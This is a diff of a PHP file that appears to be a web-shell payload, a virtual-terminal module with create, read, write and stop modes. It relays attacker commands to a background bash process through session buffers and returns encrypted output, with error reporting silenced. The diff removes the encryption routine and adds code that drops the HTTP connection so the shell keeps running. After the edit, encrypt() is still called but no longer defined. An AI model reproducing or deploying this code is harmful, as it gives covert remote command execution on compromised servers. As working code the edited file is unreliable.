@@ -1,4 +1,4 @@
-
+<?
 @error_reporting(0);
 
 function main($type, $bashPath = "", $cmd = "",$whatever = "")
@@ -7,10 +7,11 @@ function main($type, $bashPath = "", $cmd = "",$whatever = "")
     if ($type == "create") {
         create($bashPath);
         $result["status"] = "success";
+        $result["msg"] = "ok";
     } else if ($type == "read") {
+        @session_start();
     	if (isset($_SESSION["readBuffer"]))
     	{
-    	@session_start();
         $readContent = $_SESSION["readBuffer"];
         $_SESSION["readBuffer"] = substr($_SESSION["readBuffer"], strlen($readContent));
         session_write_close();
@@ -29,6 +30,7 @@ function main($type, $bashPath = "", $cmd = "",$whatever = "")
         $_SESSION["writeBuffer"] = $cmd;
         session_write_close();
         $result["status"] = "success";
+        $result["msg"] = "ok";
     }
     else if ($type == "stop") {
         @session_start();
@@ -39,7 +41,7 @@ function main($type, $bashPath = "", $cmd = "",$whatever = "")
     }
     $result["status"] = base64_encode($result["status"]);
     $result["msg"] = base64_encode($result["msg"]);
-    echo encrypt(json_encode($result),$_SESSION['k']);
+    echo encrypt(json_encode($result));
 }
 
 function getSafeStr($str){
@@ -118,6 +120,8 @@ function create($bashPath)
     @session_start();
     $_SESSION["run"] = true;
     session_write_close();
+
+    finish();
     /*
     ob_end_clean();
     header("Connection: close");
@@ -208,18 +212,14 @@ function create($bashPath)
     }
 
 }
-
-function encrypt($data,$key)
+function finish()
 {
-	if(!extension_loaded('openssl'))
-    	{
-    		for($i=0;$i<strlen($data);$i++) {
-    			 $data[$i] = $data[$i]^$key[$i+1&15]; 
-    			}
-			return $data;
-    	}
-    else
-    	{
-    		return openssl_encrypt($data, "AES128", $key);
-    	}
+    ob_end_clean();
+    header("Connection: close");
+    ignore_user_abort();
+    ob_start();
+    $size = ob_get_length();
+    header("Content-Length: $size");
+    ob_end_flush();
+    flush();
 }
